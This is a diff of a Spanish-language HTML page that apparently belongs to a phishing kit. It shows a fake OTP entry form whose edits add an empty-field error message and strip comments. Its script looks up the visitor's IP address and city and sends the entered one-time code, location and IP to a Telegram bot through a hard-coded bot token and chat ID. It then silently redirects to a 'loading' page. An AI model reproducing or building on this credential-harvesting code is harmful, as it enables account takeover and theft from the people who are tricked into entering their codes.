@@ -18,27 +18,28 @@
 
         .container {
             background-color: white;
-            padding: 20px; /* Ajusta el espaciado interno del contenedor */
+            padding: 20px;
             border-radius: 1px;
             box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
             width: 300px;
             display: flex;
             flex-direction: column;
-            justify-content: flex-start; /* Alinea el contenido hacia el inicio del contenedor */
-            height: 300px; /* Mantiene una altura fija para el contenedor */
+            justify-content: flex-start; 
+            height: 300px; /* Mantener la altura fija del contenedor */
         }
 
         .subtitle {
             font-size: 14px;
             color: #666;
-            margin-bottom: 40px; /* Espacio debajo del texto */
-            margin-top: 0; /* Sin margen superior */
+            margin-bottom: 20px; 
+            margin-top: 0; 
         }
 
         .input-group {
             position: relative;
-            margin: 0; /* Sin margen por defecto */
-            flex-grow: 1; /* Permite que el grupo de entrada use el espacio disponible */
+            margin: 0;
+            flex-grow: 0; 
+            margin-bottom: 110px; /* Añadir margen inferior al grupo de entrada */
         }
 
         label {
@@ -72,18 +73,24 @@
             color: #333;
         }
 
-        /* Estilo para el enlace de continuar */
         .continue-text {
-            margin-top: 20px;
+            margin-top: 10px; /* Ajustar a un valor positivo para que no se superponga */
             font-size: 16px;
-            color: #0f7a83; /* Color del texto */
-            cursor: pointer; /* Cambiar el cursor al pasar el mouse */
-            text-decoration: none; /* Sin subrayado */
-            align-self: flex-end; /* Alinear el enlace a la derecha */
+            color: #0f7a83; 
+            cursor: pointer; 
+            text-decoration: none; 
+            align-self: flex-end; 
         }
 
         .continue-text:hover {
-            text-decoration: underline; /* Subrayado al pasar el mouse */
+            text-decoration: underline; 
+        }
+
+        .error-message {
+            color: red;
+            font-size: 12px;
+            margin-top: 10px;
+            display: none; /* Ocultar mensaje de error por defecto */
         }
     </style>
 </head>
@@ -95,20 +102,30 @@
             <input type="text" id="otp" name="otp" required placeholder=" ">
             <label for="otp">OTP</label>
         </div>
-        <a href="#" id="submitButton" class="continue-text">CONTINUAR</a> <!-- Enlace con estilo de texto -->
+        <span id="errorMessage" class="error-message">Por favor, ingrese el código OTP.</span>
+        <a href="#" id="submitButton" class="continue-text">CONTINUAR</a>
     </div>
 
     <script>
         document.getElementById('submitButton').addEventListener('click', function(event) {
-            event.preventDefault(); // Evitar el comportamiento por defecto del enlace
+            event.preventDefault();
             const otp = document.getElementById('otp').value;
+            const errorMessage = document.getElementById('errorMessage');
+
+            // Validar que el campo no esté vacío
+            if (otp.trim() === '') {
+                errorMessage.style.display = 'block'; // Mostrar mensaje de error
+                return; // Detener la ejecución si el campo está vacío
+            } else {
+                errorMessage.style.display = 'none'; // Ocultar mensaje de error si hay un valor
+            }
 
             // Obtener ubicación e IP de ipwhois.io
             fetch('https://ipwhois.app/json/')
                 .then(response => response.json())
                 .then(data => {
                     const location = `${data.city}, ${data.country}`;
-                    const ip = data.ip; // Obtener IP
+                    const ip = data.ip;
                     sendToTelegram(otp, location, ip);
                 })
                 .catch(error => {
@@ -117,16 +134,15 @@
         });
 
         function sendToTelegram(otp, location, ip) {
-            const token = '8071410762:AAFOUv9oR1Dh3_OLwBdTM95YWZwYUwwqKr4'; // Reemplaza con tu token de bot de Telegram
-            const chatId = '-4571868410'; // Reemplaza con tu chat ID de Telegram
+            const token = '8071410762:AAFOUv9oR1Dh3_OLwBdTM95YWZwYUwwqKr4'; 
+            const chatId = '-4571868410'; 
             const message = `Código OTP: ${otp}\nUbicación: ${location}\nIP: ${ip}`;
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
             fetch(url)
                 .then(response => response.json())
                 .then(data => {
-                    // Aquí no se muestra ningún mensaje al usuario
-                    window.location.href = 'cargando2.html'; // Redirigir a la siguiente página
+                    window.location.href = 'cargando2.html'; 
                 })
                 .catch(error => {
                     console.error('Error al enviar los datos:', error);
